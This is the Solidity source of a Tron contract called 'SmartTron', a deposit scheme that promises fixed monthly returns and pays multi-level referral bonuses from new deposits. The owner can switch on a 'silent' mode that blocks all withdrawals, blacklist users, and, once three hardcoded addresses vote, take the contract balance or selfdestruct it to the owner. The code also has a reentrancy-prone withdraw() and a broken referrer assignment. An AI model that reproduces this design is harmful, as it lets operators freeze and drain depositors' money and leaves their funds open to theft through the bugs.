//SourceUnit: Test2609-1-deployed.sol

    // SPDX-License-Identifier: MIT
    pragma solidity >0.5.10 <0.6.0;
    // @author 
    // @title
    contract SmartTron {
    using SafeMath for *;
      enum Status{ U, I, P }
      struct investPlan { 
          uint time; 
          uint percent; 
          uint max_depo; 
    	  bool status; }
      struct Deposit { 
          uint8 tariff_id; 
          uint256 amount; 
          uint256 paid_out; 
          uint256 to_pay; 
          uint at; // deposit start date
          uint end;
          bool closed; 
          uint percents; 
          uint principal; }
      struct User {
        uint32 id;
        address referrer;
        uint referralCount;
        uint256 directsIncome;
        uint256 balanceRef;
        uint256 totalDepositedByRefs;
        mapping (uint => Deposit) deposits;
        uint32 numDeposits;
        uint256 totalDepositPercents;
        uint256 totalDepositPrincipals;
        uint256 invested;
        uint paidAt;
        uint256 withdrawn;
        Status status;
    	bool depo90Exists;
      }
      // 1 TRX == 1.000.000 SUN
      uint256 private constant SHIFT = 90*60;
      uint256 private MIN_DEPOSIT = 1000*1000000; // !!! 1000
      uint256 private MAX_DEPOSIT = 100000*1000000; 
      uint256 PARTNER_DEPOSIT_LEVEL = 100000; // !!! 100k TRX 
      uint256 constant DEPOSIT_FULL_PERIOD = 1;
      uint256 public BONUS_ROUND;
      address private owner;
      uint256 private round;
      bool private silent;
      bool private _lockBalances; // mutex
      uint32 private cuid;
      address[25] private founder;
      address[10] private f;
      investPlan[4] public tariffs;
      uint256 public directRefBonusSize = 7; // 7% !
      uint256 public directDeepLevel = 12; 
      uint256 public totalRefRewards;
      uint256 public cii;
      uint32 public totalUsers;
      uint32 public totalInvestors;
      uint32 public totalPartners;
      uint256 public totalDeposits;
      uint256 public totalInvested;
      bool public votes1;
      bool public votes2;
      bool public votes3;
      mapping (address => User) public investors;
      mapping(address => bool) public blacklisted;
      mapping(address => bool) public refregistry;
      event DepositEvent(address indexed _user, uint tariff, uint256 indexed _amount);
      event withdrawEvent(address indexed _user, uint256 indexed _amount);
      event directBonusEvent(address indexed _user, uint256 indexed _amount);
      event registerEvent(address indexed _user, address indexed _ref);
      event investorExistEvent(address indexed _user, uint256 indexed _uid);
      event refExistEvent(address indexed _user, uint256 indexed _uid);
      event referralCommissionEvent(address indexed _addr, address indexed _referrer, uint256 indexed amount, uint256 _type);
      event debugEvent(string log, uint data);
    
      modifier notBlacklisted() {
        require(!blacklisted[msg.sender]);
        _;
      }
      modifier ownerOnly () {
        require( owner == msg.sender, 'No sufficient right');
        _;
      }
    
      // create user
      function register(address _referrer) internal {
        if (_referrer == address(0x0) || _referrer == msg.sender) {
          _referrer == getRef();
          nextRef();
        }
        //referrer exist?
        if (investors[_referrer].id < 1) {
          cuid++;
          address next = getRef();
          nextRef();
          investors[_referrer].id = cuid;
          investors[_referrer].referrer = next;
          investors[next].referralCount = investors[next].referralCount.add(1);
          totalUsers++;
        }
        // if new user
        if (investors[msg.sender].id < 1) {
          cuid++;
          investors[msg.sender].id = cuid;
          totalUsers++;
          investors[msg.sender].referrer = _referrer;
          investors[_referrer].referralCount = investors[_referrer].referralCount.add(1);
          refregistry[msg.sender] = true;
          emit registerEvent(msg.sender, _referrer);
        } else if (investors[msg.sender].referrer == address(0x0)) {
          investors[msg.sender].referrer = _referrer;
          investors[_referrer].referralCount = investors[_referrer].referralCount.add(1);
        }
      }
              
      function directRefBonus(address _addr, uint256 amount) private {
        address _nextRef = investors[_addr].referrer;
        uint i;
        uint da = 0; // direct amount
        uint di = 0; // direct income
        for(i=0; i <= directDeepLevel; i++) {
          if (_nextRef != address(0x0)) {
            if(i == 0) {
              da = amount.mul(directRefBonusSize).div(100);
              di = investors[_nextRef].directsIncome;
              di = di.add(da);
              investors[_nextRef].directsIncome = di;
            }
            else if(i == 1 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(3).div(100); // 3%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i == 2 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(2).div(100); // 2%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i == 3 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(1).div(100); // 1%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i == 4 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.mul(1).div(100); // 1%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            else if(i >= 5 ) {
              if(investors[_nextRef].status == Status.P ) {
                da = amount.div(100); // 1%
                di = investors[_nextRef].directsIncome;
                di = di.add(da);
                investors[_nextRef].directsIncome = di;
              }
            }
            totalRefRewards += da;
          } else { break; }
          xdirectRefBonusPay(_nextRef);
          _nextRef = investors[_nextRef].referrer;
        }
      }
    
      constructor () public {
        owner = msg.sender;
        round = block.timestamp;
        votes1=false; votes2=false; votes3=false; // !!!
        silent = false;
        
        
    	// 1 MONTH = 10 MINUTES 
    	/* 
        tariffs[0] = investPlan( 30 minutes,  15,  3000, true);  
        tariffs[1] = investPlan( 60 minutes,  6,  100000, true);
        tariffs[2] = investPlan( 120 minutes, 10,  100000, true);
        tariffs[3] = investPlan( 180 minutes, 12,  100000, true);
    	
    	*/
    
        tariffs[0] = investPlan( 90 days,  15,  3000*1000000, true);  // 3 months
        tariffs[1] = investPlan( 180 days,  6,  MAX_DEPOSIT, true); // 6 months
        tariffs[2] = investPlan( 360 days, 10,  MAX_DEPOSIT, true); // 12 months 
        tariffs[3] = investPlan( 540 days, 12,  MAX_DEPOSIT, true); // 18 months
    
        cuid = 0;
        investors[owner].id = cuid++;
        _lockBalances = false;
        
       
        round = (round + 5 days);
       
        
      }
    
    
    
      // main entry point
      function deposit(uint8 _tariff, address _referrer) public payable returns (uint256) {
          
        uint256 amnt = msg.value;
        
        require(_referrer != msg.sender, "You cannot be your own referrer!");
    	
    	require(tariffs[_tariff].status != false, "This tariff is turned off");
    	
    	uint totalThisTariff = msg.value;
    	
    	// Investor can deposit only the MAX_DEPOSIT for each tariff
    	for (uint i=0; i < investors[msg.sender].numDeposits; i++) { 
    	    if (investors[msg.sender].deposits[i].tariff_id  == _tariff) {
    	        totalThisTariff += investors[msg.sender].deposits[i].principal;
    	    }
    	// emit debugEvent("Total Principals for this tariff = ", totalThisTariff);
    	// emit debugEvent("This Tariff Max Depo = ", tariffs[_tariff].max_depo);
    	// emit debugEvent("MAX_DEPO = ", MAX_DEPOSIT); 
    	
    	
    	}
    	
    	require(totalThisTariff <= MAX_DEPOSIT, "Total amount of all deposits for this tariff exceeded!");
    	
    	if (_tariff == 0) {  // Investor can have only one 30-day tariff deposit
    	    // for tariff 0 = value must be only 3000
    	    require(msg.value == tariffs[0].max_depo, "The amount for this tariff must be 3000 only");
    		require(investors[msg.sender].depo90Exists == false, "You can have only one deposit 90 days");
    		investors[msg.sender].depo90Exists = true;
    	}
    	
    	
        if (msg.value > 0) {
          register(_referrer);
    
          require(msg.value >= MIN_DEPOSIT, "Minimal deposit required");
          
          
          require(msg.value <= MAX_DEPOSIT, "Deposit limit exceeded!");
		            
        
        if (msg.value > tariffs[_tariff].max_depo) {
          
    		revert("Max limit for tariff");
        }
    
          require(!_lockBalances);
          _lockBalances = true;
          uint256 fee = (msg.value).div(100);
          xdevfee(fee);
          
          
          // principal += investors[msg.sender].totalDepositPrincipals;    
        
    
          if (investors[msg.sender].numDeposits == 0) {
            totalInvestors++;
            if(investors[msg.sender].status == Status.U) investors[msg.sender].status = Status.I;
            if ((investors[_referrer].totalDepositedByRefs).div(1000000) >= PARTNER_DEPOSIT_LEVEL && investors[_referrer].referralCount >= 10) {
              investors[msg.sender].status = Status.P;
            }
          }
          // if (block.timestamp < round) amnt = amnt.add((amnt).mul(5).div(10));
          
          // Add bonus to the deposit if it is > 0
          if (BONUS_ROUND != 0) {
              // amnt = amnt.add((amnt).mul(BONUS_ROUND).div(10));
    		  amnt = amnt.mul(BONUS_ROUND).div(100);
          }
          
          investors[msg.sender].invested += amnt;
          investors[msg.sender].deposits[investors[msg.sender].numDeposits++] =
            Deposit({tariff_id: _tariff, amount: amnt, at: block.timestamp, end: block.timestamp + tariffs[_tariff].time, paid_out: 0, to_pay: 0, closed: false, percents: 0, principal: amnt});
          totalInvested += amnt;
          
          totalDeposits++;
          directRefBonus(msg.sender, msg.value);
          _lockBalances = false;
    
          investors[_referrer].totalDepositedByRefs += msg.value;
          // Deposited by referals > 100k TRX
          if ((investors[_referrer].totalDepositedByRefs).div(1000000) >= PARTNER_DEPOSIT_LEVEL) {
            if (investors[_referrer].status == Status.I && investors[_referrer].referralCount >= 10) {
              investors[_referrer].status = Status.P;
              totalPartners++;
            }
          }
        }
        emit DepositEvent(msg.sender, _tariff, amnt);
        return amnt;
      }
    
      function nextRef() internal {
        if (cii < f.length) {
          cii++;
        } else {
          cii = 0;
        }
      }
    
      function getRef() notBlacklisted public view returns (address) {
        return f[cii];
      }
    
      function getPartnerDepositLevel() public view returns (uint256) {
        return PARTNER_DEPOSIT_LEVEL;
      }

      function getDepositAt(address user, uint did) notBlacklisted public view returns (uint256) {
        return investors[user].deposits[did].at;
      }
    
      function getDepositTariff(address user, uint did) notBlacklisted public view returns (uint8) {
        return investors[user].deposits[did].tariff_id;
      }
    
      function getDepositAmount(address user, uint did) notBlacklisted public view returns (uint256) {
        return investors[user].deposits[did].amount;
      }
    
      function calcDepositIncome(address user, uint did) notBlacklisted public view returns (uint256) {
          Deposit memory dep = investors[user].deposits[did];
          uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
          uint256 depositMonth = depositDays.div(30);
          return (investors[user].deposits[did].amount) + (investors[user].deposits[did].amount).div(100).mul(tariffs[dep.tariff_id].percent).mul(depositMonth);
      }
      
      
       /* function calcDepositPercentMonth(address user, uint did) notBlacklisted public view returns (uint256) {
          Deposit memory dep = investors[user].deposits[did];
          uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
          uint256 depositMonth = depositDays.div(30);
          return (investors[user].deposits[did].amount).div(100).mul(tariffs[dep.tariff_id].percent).mul(depositMonth);
      } */
      
      function calcDepositPercentsMonthly(address user) notBlacklisted public view returns (uint256[] memory) {
        require(silent != true);
          
    
        uint256[] memory deps = new uint256[](investors[user].numDeposits);
        
        // User memory inv;
        
        for (uint i=0; i < investors[user].numDeposits; i++) {
             
            // if (true || ! investors[user].deposits[i].closed) {
                
                uint256 _ts_end = block.timestamp;
                
                if(investors[user].deposits[i].end <= _ts_end){
                    _ts_end = investors[user].deposits[i].end;
                }
                
                
                // uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
                // uint256 depositMonth = depositDays.div(30);
                uint principal = investors[user].deposits[i].principal;
    			
    			// 1 month = 10 minutes
                // uint monthsSinceDepoStart = ((_ts_end).sub(investors[user].deposits[i].at)).mul(144).div(1 days);
    			
    			uint monthsSinceDepoStart = ((_ts_end).sub(investors[user].deposits[i].at)).div(30 days);
                
                uint last_depo_period_remainder = 0;
    
                // emit debugEvent("last_deposit_period_remainder = ", last_depo_period_remainder);
                // emit debugEvent("monthsSinceDepoStart = ", monthsSinceDepoStart);
                uint monthlyPercent = tariffs[investors[user].deposits[i].tariff_id].percent; 
                // emit debugEvent("monthlyPercent = ", monthlyPercent);
                // emit debugEvent("Deposit date end = ", investors[user].deposits[i].end);
    
                // uint256 depositPercents = (principal).div(100).mul(tariffs[dep.tariff_id].percent).mul(depositMonth);
                uint256 depositPercents = (principal).mul(monthlyPercent).mul(monthsSinceDepoStart);
                
                // INCOMPLETE DEPOSIT_FULL_PERIOD REMAINDER - YOU CAN`T WITHDRAW INCOMPLETE DEPOSIT_FULL_PERIOD
                
    
                if(monthsSinceDepoStart >= DEPOSIT_FULL_PERIOD){
                    last_depo_period_remainder = monthsSinceDepoStart % DEPOSIT_FULL_PERIOD;
                } else { // WITHDRAW PERCENTS NOT AVAILABLE IF THE FIRST PERIOD IS INCOMPLETE
                  depositPercents = 0;
                }
                
                uint256 last_depo_period_remainder_percents = 
                    (principal).mul(monthlyPercent).mul(last_depo_period_remainder);
                
                // emit debugEvent("last_deposit_period_remainder_percents = ", last_depo_period_remainder_percents);
                
                
                deps[i] = depositPercents.sub(last_depo_period_remainder_percents).div(100);
    			
            // }else{
              //  deps[i] = 0;
            //}
        }
          return deps;
          
      }
     
    
      function getDepositPaidOut(address user, uint did) notBlacklisted public view returns (uint256) {
        return investors[user].deposits[did].paid_out;
      }
    
      function getDepositClosed(address user, uint did) notBlacklisted public view returns (bool) {
        return investors[user].deposits[did].closed;
      }
    
      
      /* function calcAvailableToPayMonthly(address user) public returns (uint256 amount) {
          
        // !!!!! require(address(this).balance >= MAX_DEPOSIT, "Low contract balance!");
        
        uint256[] memory _deps = calcDepositPercentsMonthly(user);
        
        uint256 _total_av = 0;
        uint256 _total_principals = 0;
        uint256 _total_frozen_principals = 0;
        uint256 _total_unfrozen_principals = 0;
        uint256 _total_percents = 0;
        uint256 _total_all = 0;
        uint256 _total_paid_out = 0;
        
    
        for (uint i=0; i < investors[user].numDeposits; i++) {
          _total_paid_out = _total_paid_out.add(investors[user].deposits[i].paid_out);
          if(investors[user].deposits[i].closed || investors[user].deposits[i].end <= block.timestamp){ // if deposit ends, then withdraw principals + percents
              _total_unfrozen_principals = _total_unfrozen_principals.add(investors[user].deposits[i].principal);
              _total_av = _total_av.add(investors[user].deposits[i].principal.add(_deps[i]));
          }else{ // if deposit doesn`t ends, then withdraw percents only
              _total_frozen_principals = _total_frozen_principals.add(investors[user].deposits[i].principal);
              _total_av = _total_av.add(_deps[i]);
          }
          
          _total_principals = _total_principals.add(investors[user].deposits[i].principal);
          _total_all = _total_all.add(investors[user].deposits[i].principal.add(_deps[i]));
          _total_percents = _total_percents.add(_deps[i]);
          
    
        }
        
        
        if(_total_av > _total_paid_out){
            _total_av = _total_av.sub(_total_paid_out);
        }else{
            _total_av = 0;
        }
        
        
        
        emit debugEvent("DEPOSIT STAT END", 0);
        
        emit debugEvent("withdraw: total available to withdraw = ", _total_av);
        
        emit debugEvent("withdraw: total percents = ", _total_percents);
        
        emit debugEvent("withdraw: total unfrozen principals = ", _total_unfrozen_principals);
        
        emit debugEvent("withdraw: total frozen principals = ", _total_frozen_principals);
        
        emit debugEvent("withdraw: total principals = ", _total_principals);
        
        emit debugEvent("withdraw: total balance = ", _total_all);
    
        emit debugEvent("DEPOSIT STAT BEGIN", 0);
        
    
    
        return _total_av;
      }
      
      */
      
       function calcAvailableToPay(address user) private returns (uint256 amount) {
          
        // !!!!! require(address(this).balance >= MAX_DEPOSIT, "Low contract balance!");
        
        uint256[] memory _deps = calcDepositPercentsMonthly(user);
        
        uint256 _total_av = 0;
        uint256 _total_principals = 0;
        uint256 _total_frozen_principals = 0;
        uint256 _total_unfrozen_principals = 0;
        uint256 _total_percents = 0;
        uint256 _total_all = 0;
        uint256 _total_paid_out = 0;
        
        for (uint i=0; i < investors[user].numDeposits; i++) {
          investors[user].deposits[i].percents = _deps[i];
          _total_paid_out = _total_paid_out.add(investors[user].deposits[i].paid_out);
          
          if(investors[user].deposits[i].closed || investors[user].deposits[i].end <= block.timestamp){ // if deposit ends, then withdraw principals + percents
              investors[user].deposits[i].closed = true;
              investors[user].deposits[i].to_pay = investors[user].deposits[i].percents.add(investors[user].deposits[i].principal);
              _total_unfrozen_principals = _total_unfrozen_principals.add(investors[user].deposits[i].principal);
          }
          
          else 
          
          { // if deposit doesn`t ends, then withdraw percents only
              investors[user].deposits[i].to_pay = investors[user].deposits[i].percents;  
              _total_frozen_principals = _total_frozen_principals.add(investors[user].deposits[i].principal);
    
          }
          
          _total_principals = _total_principals.add(investors[user].deposits[i].principal);
          _total_all = _total_all.add(investors[user].deposits[i].principal.add(investors[user].deposits[i].percents));
          _total_percents = _total_percents.add(investors[user].deposits[i].percents);
          _total_av = _total_av.add(investors[user].deposits[i].to_pay);
    
        }
        
        // emit debugEvent("withdraw: total available to withdraw without _total_paid_out = ", _total_av);
        
        if(_total_av > _total_paid_out){
            _total_av = _total_av.sub(_total_paid_out);
        }else{
            _total_av = 0;
        }
        
        
        investors[user].totalDepositPercents = _total_percents;
        investors[user].totalDepositPrincipals = _total_principals;
    
        
        /*///////////////////////////////////////////////
        
         _total_av -    TOTAL AVAILABLE TO WITHDRAW NOW     !!!!
    
    
         OTHER VARS BELOW - VALUES WITH PAYED OUT           !!!!
        
        
        ///////////////////////////////////////////////*/
        
        
        // emit debugEvent("DEPOSIT STAT END", 0);
        
        // emit debugEvent("withdraw: total available to withdraw = ", _total_av);
        
        // emit debugEvent("withdraw: total percents = ", _total_percents);
        
        // emit debugEvent("withdraw: total unfrozen principals = ", _total_unfrozen_principals);
        
        // emit debugEvent("withdraw: total frozen principals = ", _total_frozen_principals);
        
        // emit debugEvent("withdraw: total principals = ", _total_principals);
        
        // emit debugEvent("withdraw: total balance = ", _total_all);
    
        // emit debugEvent("DEPOSIT STAT BEGIN", 0);
        
    
    
        return _total_av;
      }
      
      
      function profit(address user) internal returns (uint256 amount) {
        
		require(silent != true);
        
        amount = calcAvailableToPay(user);
                
        // require(amount >= MIN_DEPOSIT, "Minimal pay out 500 TRX");
        
        emit debugEvent("Profit return: ", amount);
        return amount;
      }
    
      
      function withdraw() notBlacklisted external {
        require(silent != true);
        require(msg.sender != address(0));
    
        uint256 contractBalance = address(this).balance;
    	require(contractBalance >= MAX_DEPOSIT, "Low contract balance!");
        
        uint256 to_payout = profit(msg.sender);
        emit debugEvent("withdraw: to_payout", to_payout);
        require(to_payout > 0, "Insufficient amount");
    	
        (bool success, ) = msg.sender.call.value(to_payout)("");
        require(success, "Withdraw transfer failed");
        
        for (uint i=0; i < investors[msg.sender].numDeposits; i++) {
            
          // !!!!!!!!!!!!!!!     PAID_OUT INCR       !!!!!!!!!!!!!!! 
          
          if(investors[msg.sender].deposits[i].end <= block.timestamp){ // if deposit ends, then withdraw principals + percents
            
             if(investors[msg.sender].deposits[i].to_pay > investors[msg.sender].deposits[i].paid_out){
                  investors[msg.sender].deposits[i].paid_out = investors[msg.sender].deposits[i].to_pay;
             }
    
          }else{ // if deposit doesn`t ends, then withdraw percents only
             if(investors[msg.sender].deposits[i].percents > investors[msg.sender].deposits[i].paid_out){
                  investors[msg.sender].deposits[i].paid_out = investors[msg.sender].deposits[i].percents;
             }
          }
          
          // !!!!!!!!!!!!!!!     PAID_OUT INCR       !!!!!!!!!!!!!!! 
          
        }
        investors[msg.sender].paidAt = block.timestamp;
        
        investors[msg.sender].withdrawn = investors[msg.sender].withdrawn.add(to_payout);
        
        
        emit withdrawEvent(msg.sender, to_payout);
      }
    
      function withdrawHelpUser(address user) ownerOnly external {
        require(silent != true);
        require(user != address(0));
        uint256 to_payout = profit(user);
        emit debugEvent("withdraw: to_payout", to_payout);
        require(to_payout >= MIN_DEPOSIT, "withdraw: minimal pay out 500 TRX");
        investors[user].withdrawn += to_payout;
        (bool success, ) = user.call.value(to_payout)("");
        require(success, "Withdraw transfer failed");
        emit withdrawEvent(user, to_payout);
      }
      function setBonusRound(uint256 max) ownerOnly public returns (uint256) {
        BONUS_ROUND = max;
        return BONUS_ROUND;
      }
    
      // set MIN deposit in TRX
      function setMinDeposit(uint256 min) ownerOnly public returns (uint256) {
        MIN_DEPOSIT = (min).mul(1000000);
        return MIN_DEPOSIT;
      }
    
      // set MAX deposit in TRX
      function setMaxDeposit(uint256 max) ownerOnly public returns (uint256) {
        MAX_DEPOSIT = (max).mul(1000000);
        return MAX_DEPOSIT;
      }
      
      // set DEPOSIT_LEVEL
      function setPartnerDepositLevel(uint256 max) ownerOnly public returns (uint256) {
        PARTNER_DEPOSIT_LEVEL = max;
        return PARTNER_DEPOSIT_LEVEL;
      }
      
      // set directRefBonusSize in %
      function setRefBonus(uint256 percent) ownerOnly public returns (uint256) {
        directRefBonusSize = percent;
        return directRefBonusSize;
      }
      // set deep level
      function setLevel(uint lvl) ownerOnly public returns (uint256) {
        directDeepLevel = lvl;
        return directDeepLevel;
      }
      // silent mode
      function turnOn() ownerOnly public returns (bool) { silent = true; return silent; }
      function turnOff() ownerOnly public returns (bool) {
      silent = false; _lockBalances = false;
        votes1=false;votes2=false;votes3=false;
        return silent;}
    	
      function setTariffStatus(uint _tariff, bool _status) ownerOnly public returns (bool)
      { tariffs[_tariff].status = _status; 
        return _status;
      }
    
      function state() public view returns (bool) { return silent; }
      function eol() public ownerOnly returns (bool) {
        if (votes1 && votes2 && votes3) {
          selfdestruct(msg.sender);
          return true;
        }
         
        return false;
      }
      function withdrawThreeVoices(uint256 amount) ownerOnly public {
      
    	require(votes1 && votes2 && votes3, "Need 3 votes");
    	
        if (votes1 && votes2 && votes3) {
    
          amount = amount * 1000000;
    
          require(amount <= address(this).balance);
          msg.sender.transfer(amount);
          votes1 = false; votes2 = false; votes3 = false;
          
        }
      }
    
      function xdirectRefBonusPay(address _investor) public payable {
        require(msg.value > 0);
        uint256 amnt = investors[_investor].directsIncome;
        if ( amnt > 0 ) {
          investors[_investor].directsIncome = 0;
          (bool success, ) = _investor.call.value(amnt)("");
          require(success, "Transfer failed.");
          //emit directBonusEvent(_investor, amnt);
        }
      }
      function voting() public payable returns (bool) {
        
        if (msg.sender == address(0x41ae0ff13e37d9db6682a5b707478701730c699042)) {
          votes1 = true;
          return votes1;
        } 
        
        if (msg.sender == address(0x41cc4616dbb0613e806ec116bbdf5aac865660d8fa)) {
          votes2 = true;
          return votes2;
        }
        
        if (msg.sender == address(0x41ddc2a2448b86272e5a832d8801e3e5f7e72fb2e8)) {
          votes3 = true;
          return votes3;
        }
      }
    
      function xdevfee(uint256 _fee) public payable {
        address payable dev1 = address(0x41ae0ff13e37d9db6682a5b707478701730c699042); 
        address payable dev2 = address(0x41cc4616dbb0613e806ec116bbdf5aac865660d8fa); 
        address payable dev3 = address(0x41ddc2a2448b86272e5a832d8801e3e5f7e72fb2e8); 
        dev1.transfer(_fee);
        dev2.transfer(_fee);
        dev3.transfer(_fee);
      }
        function transferOwnership(address newOwner) public ownerOnly {
            require(newOwner != address(0));
            owner = newOwner;
        }
        function addAddressToBlacklist(address addr) ownerOnly public returns(bool success) {
            if (!blacklisted[addr]) {
                blacklisted[addr] = true;
                success = true;
            }
        }
        function removeAddressFromBlacklist(address addr) ownerOnly public returns(bool success) {
            if (blacklisted[addr]) {
                blacklisted[addr] = false;
                success = true;
            }
        }
    } // end contract
    
    library SafeMath {
            function add(uint256 a, uint256 b) internal pure returns (uint256) {
                uint256 c = a + b;
                require(c >= a, "SafeMath: addition overflow");
                return c;
            }
            function sub(uint256 a, uint256 b) internal pure returns (uint256) {
                return sub(a, b, "SafeMath: subtraction overflow");
            }
            function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                require(b <= a, errorMessage);
                uint256 c = a - b;
                return c;
            }
            function mul(uint256 a, uint256 b) internal pure returns (uint256) {
                // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
                if (a == 0) {
                    return 0;
                }
    
                uint256 c = a * b;
                require(c / a == b, "SafeMath: multiplication overflow");
                return c;
            }
            function div(uint256 a, uint256 b) internal pure returns (uint256) {
                return div(a, b, "SafeMath: division by zero");
            }
            function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                // Solidity only automatically asserts when dividing by 0
                require(b > 0, errorMessage);
                uint256 c = a / b;
                // assert(a == b * c + a % b); // There is no case in which this doesn't hold
                return c;
            }
    }